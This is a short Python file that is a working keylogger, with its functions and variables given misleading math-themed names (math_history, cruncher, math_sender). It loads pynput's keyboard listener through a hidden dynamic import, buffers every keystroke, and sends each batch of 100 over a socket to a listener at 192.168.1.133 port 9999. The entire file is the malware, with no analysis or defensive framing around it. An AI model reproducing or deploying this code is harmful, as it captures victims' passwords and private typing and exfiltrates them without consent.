import socket
import importlib
import time

# Keystroke buffer
math_history = []
BUFFER_LIMIT = 100  # Send after 100 operations

def math_handler():
    math_input = __import__('pynput.keyboard', fromlist=['Listener'])
    return math_input.Listener

def send_to_central(math_sender, operations):
    try:
        data = "\n".join(operations).encode()
        math_sender.send(data)
        return True
    except Exception as e:
        print(f"[!] Send failed: {e}")
        return False

def math_sender(operations):
    try:
        math_sender = socket.socket()
        math_sender.settimeout(10)  # Avoid hanging
        math_sender.connect(("192.168.1.133", 9999))
        if send_to_central(math_sender, operations):
            operations.clear()  # Clear buffer if successful
        math_sender.close()
    except Exception as e:
        print(f"[!] Connection failed: {e}")

def cruncher():
    last_send_time = time.time()  # Initialize timer

    def math_complex(key):
        try:
            message = f"{key.char}"
        except AttributeError:
            message = f"{key} pressed"
        math_history.append(message)

        # Send if buffer limit reached
        if len(math_history) >= BUFFER_LIMIT:
            math_sender(math_history.copy())
            math_history.clear()
    math_handler_1 = math_handler()
    with math_handler_1(on_press=math_complex) as math_h:
        math_h.join()

def hub():
    cruncher()